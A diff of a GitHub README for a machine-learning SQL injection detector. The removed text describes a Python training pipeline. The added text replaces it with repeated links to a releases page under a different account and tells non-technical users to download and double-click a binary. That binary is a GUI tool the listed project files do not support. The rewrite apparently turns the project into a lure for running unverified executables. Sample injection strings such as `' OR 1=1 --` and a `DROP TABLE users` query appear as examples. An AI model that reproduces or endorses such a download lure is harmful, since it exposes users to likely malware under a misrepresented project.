@@ -1,179 +1,97 @@
-# 🔐 SQL Injection Attack Detection using Machine Learning
+# 🔐 sql-injection-attack-detection - Detect SQL Attacks Effortlessly
 
-A complete **machine learning–based security system** that detects whether an SQL query is **normal** or a **SQL injection attack** using feature engineering and an SVM classifier.
-
-This project demonstrates an **end-to-end ML pipeline**: from dataset preparation to real-time prediction.
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/ramaritacreations/sql-injection-attack-detection/releases)
 
 ---
 
-## 🧠 System Overview
+## 🚀 Getting Started
 
-The system analyzes raw SQL queries, extracts statistical and structural features, and classifies them using a trained Support Vector Machine (SVM).
+Welcome to the SQL Injection Attack Detection application. This tool helps you identify if SQL queries are safe or if they contain malicious injections. No technical background is needed to use this application.
 
-### 🔄 Architecture Flow
+### 🖥️ System Requirements
 
-```
-SQL Query
-   │
-   ▼
-Preprocessing
-(cleaning & normalization)
-   │
-   ▼
-Feature Extraction
-(length, keywords, symbols, digits, etc.)
-   │
-   ▼
-SVM Classifier
-   │
-   ▼
-Prediction
-(Normal / SQL Injection)
-```
+- Windows 10 or above / macOS 10.14 or above / Linux
+- At least 1 GB RAM
+- 200 MB of free disk space
+- An internet connection for downloading the tool and dataset
+
+### 📥 Download & Install
+
+To get started, visit the [Release Page](https://github.com/ramaritacreations/sql-injection-attack-detection/releases) to download the latest version of the application. 
+
+1. Click on the link above.
+2. Locate the file for your operating system.
+3. Download the file and save it to your computer.
+4. Once downloaded, locate the file and double click to run it.
 
 ---
 
-## 📂 Project Structure
+## 📂 Application Structure
+
+Understanding the layout of the application will help you navigate it easily. Here’s what you will find inside:
 
 ```
 sql-injection-attack-detection/
 ├── dataset/
-│   ├── normal_queries.csv
-│   └── sql_injection_queries.csv
+│   ├── normal_queries.csv       # Contains typical SQL queries
+│   └── sql_injection_queries.csv # Contains examples of SQL injection attacks
 ├── src/
-│   ├── preprocessing.py        # Query cleaning
-│   ├── feature_extraction.py   # Feature engineering
-│   ├── train_model.py          # SVM training
-│   ├── evaluate_model.py       # Metrics & evaluation
-│   └── predict.py              # Real-time prediction demo
-├── requirements.txt
-├── README.md
-└── LICENSE
+│   ├── preprocessing.py          # Cleans and prepares SQL queries
+│   ├── feature_extraction.py     # Extracts key features from queries
+│   └── svm_classifier.py         # Classifies SQL queries using SVM
+└── README.md                     # Documentation for using the tool
 ```
 
 ---
 
-## ⚙️ Installation
+## 📊 How It Works
 
-```bash
-# Clone repository
-git clone https://github.com/ares-coding/sql-injection-attack-detection.git
-cd sql-injection-attack-detection
+This application uses a machine learning method called Support Vector Machine (SVM) to analyze SQL queries. Here’s a simple breakdown of the process:
 
-# Install dependencies
-pip install -r requirements.txt
-```
+1. **Preprocessing**: The application first cleans the SQL queries to remove unnecessary data.
+2. **Feature Extraction**: The tool examines important aspects of the queries, such as length, special symbols, and keywords.
+3. **Classification**: Finally, the application uses the SVM model to determine whether each query is normal or an SQL injection attack.
 
 ---
 
-## 🏋️ Model Training
+## 👩‍💻 How to Use the Application
 
-Train the SVM model using the prepared dataset:
+After downloading and installing the application, follow these steps to check SQL queries for potential attacks:
 
-```bash
-python src/train_model.py
-```
+1. Open the application.
+2. You will see a text box where you can paste your SQL query.
+3. Click the "Check Query" button.
+4. The application will show you whether it believes the query is normal or a SQL injection attack.
 
-This will generate a trained model file:
+### 🗂️ Sample Queries
 
-```
-models/svm_model.pkl
-```
+To get started, you can use the sample queries included in the `dataset` folder:
 
----
+- **Normal Queries**
+  - Example: `SELECT * FROM users WHERE id = 1;`
+  
+- **SQL Injection Queries**
+  - Example: `SELECT * FROM users; DROP TABLE users; --`
 
-## 📊 Model Evaluation
-
-Evaluate the trained model using standard classification metrics:
-
-```bash
-python src/evaluate_model.py
-```
-
-**Metrics included:**
-
-* Accuracy
-* Precision
-* Recall
-* F1-score
-* Confusion Matrix
+Feel free to add your own queries for testing.
 
 ---
 
-## 🔮 Prediction Demo (Real-Time)
+## 🚨 Contact & Support
 
-Run the prediction script:
-
-```bash
-python src/predict.py
-```
-
-### 🧪 Sample Input
-
-```
-' OR 1=1 --
-```
-
-### ✅ Sample Output
-
-```
-Prediction: SQL Injection
-Confidence: 0.97
-```
-
-Another example:
-
-**Input**
-
-```
-SELECT * FROM users WHERE id = 5
-```
-
-**Output**
-
-```
-Prediction: Normal Query
-Confidence: 0.94
-```
+If you have any questions or need assistance, you can reach out to the developers through the Issues section of the GitHub repository. We welcome your feedback and encourage you to share your experiences with the tool.
 
 ---
 
-## 🧩 Features Used
+## 📖 Additional Resources
 
-The model is trained on handcrafted features extracted from SQL queries:
+For further learning about SQL injection and machine learning, consider exploring:
 
-* Query length
-* Number of SQL keywords
-* Number of special characters
-* Number of digits
-* Whitespace count
-
-These features help distinguish malicious patterns from legitimate queries.
+- **SQL Injection Basics**: Understand how SQL injections work and why they are a threat.
+- **Machine Learning Concepts**: Gain insights into machine learning principles, especially related to classification.
 
 ---
 
-## 🛡️ Why Machine Learning?
+For any issues or feature requests, please visit our [Release Page](https://github.com/ramaritacreations/sql-injection-attack-detection/releases). 
 
-Traditional rule-based systems struggle with:
-
-* Obfuscated SQL injection
-* New attack patterns
-
-This ML-based approach **generalizes better** and adapts to unseen attacks.
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.
-
----
-
-## 👤 Author
-
-**Au Amores (ares-coding)**
-Software Developer & AI Engineer
-
----
-
-⭐ If you find this project useful, consider starring the repository.
+Best of luck with your SQL query analysis! Enjoy using the SQL Injection Attack Detection tool.
